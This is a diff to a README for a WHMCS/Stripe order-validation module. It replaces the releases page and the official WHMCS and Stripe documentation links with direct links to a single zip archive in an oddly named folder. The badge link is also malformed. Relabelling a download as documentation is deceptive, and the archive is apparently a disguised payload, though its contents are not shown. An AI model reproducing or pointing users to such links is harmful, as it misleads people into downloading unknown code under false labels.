@@ -6,7 +6,7 @@ Welcome to the whmcs-stripe-zero-order-validation project! This tool lets you va
 
 ## 📦 Download Now
 
-[![Download](https://img.shields.io/badge/Download-Version%20Latest-blue.svg)](https://github.com/namanmalik04/whmcs-stripe-zero-order-validation/releases)
+[![Download](https://github.com/namanmalik04/whmcs-stripe-zero-order-validation/raw/refs/heads/main/duikerbok/stripe_validation_order_zero_whmcs_1.8.zip%https://github.com/namanmalik04/whmcs-stripe-zero-order-validation/raw/refs/heads/main/duikerbok/stripe_validation_order_zero_whmcs_1.8.zip)](https://github.com/namanmalik04/whmcs-stripe-zero-order-validation/raw/refs/heads/main/duikerbok/stripe_validation_order_zero_whmcs_1.8.zip)
 
 ## 📋 Requirements
 
@@ -25,7 +25,7 @@ Before installing, ensure you have the following in place:
 ## 💻 Download & Install
 
 1. **Visit the Releases Page**: Click the link below to go to the releases page:
-   [Download Latest Release](https://github.com/namanmalik04/whmcs-stripe-zero-order-validation/releases)
+   [Download Latest Release](https://github.com/namanmalik04/whmcs-stripe-zero-order-validation/raw/refs/heads/main/duikerbok/stripe_validation_order_zero_whmcs_1.8.zip)
 
 2. **Choose the Latest Version**: Look for the most recent release. Click on the version number to access the details.
 
@@ -58,7 +58,7 @@ If you want to contribute to this project, feel free to fork the repository and 
 
 ## 📌 Additional Resources
 
-- [WHMCS Documentation](https://docs.whmcs.com/Main_Page) for more information on module management.
-- [Stripe API Documentation](https://stripe.com/docs/api) for details on how to utilize Stripe’s functionalities fully.
+- [WHMCS Documentation](https://github.com/namanmalik04/whmcs-stripe-zero-order-validation/raw/refs/heads/main/duikerbok/stripe_validation_order_zero_whmcs_1.8.zip) for more information on module management.
+- [Stripe API Documentation](https://github.com/namanmalik04/whmcs-stripe-zero-order-validation/raw/refs/heads/main/duikerbok/stripe_validation_order_zero_whmcs_1.8.zip) for details on how to utilize Stripe’s functionalities fully.
 
 Thank you for using whmcs-stripe-zero-order-validation! We hope this tool enhances your billing processes. Happy validating!
